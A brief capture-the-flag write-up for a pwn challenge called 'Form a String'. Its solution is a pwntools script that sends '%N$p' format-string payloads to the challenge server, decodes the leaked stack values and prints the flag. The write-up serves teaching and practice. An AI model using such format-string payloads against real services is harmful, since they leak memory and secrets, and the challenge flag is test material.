# Form a String

> Points: 50

> Category: pwn

## Description

Every time I input a string, it seems to respond back with the same message. Perhaps there is something we can do to get the flag out of there.

## Attachments

`nc 34.203.197.39 3000`

https://imaginary.ml/r/BC4B-Form_a_String.rar

## Solution

This challenge had to do with the [form a string vulnerability](https://www.geeksforgeeks.org/format-string-vulnerability-and-prevention-with-example/)

```py
from pwn import *
from Crypto.Util.number import long_to_bytes

r = remote("34.203.197.39", 3000)
r.recvline()

query = ""
for i in range(1, 25):
    query += "%{}$p ".format(str(i))

r.sendline(query.encode())
res = r.recvlineS().split(" ")
#print(res)
for i in res:
    try:
        print(long_to_bytes(int(i, 16))[::-1])
    except Exception as e:
        continue
```

### Flag

> ictf{f0rm4t_s7r1ngs_4r3_w17h_printf}
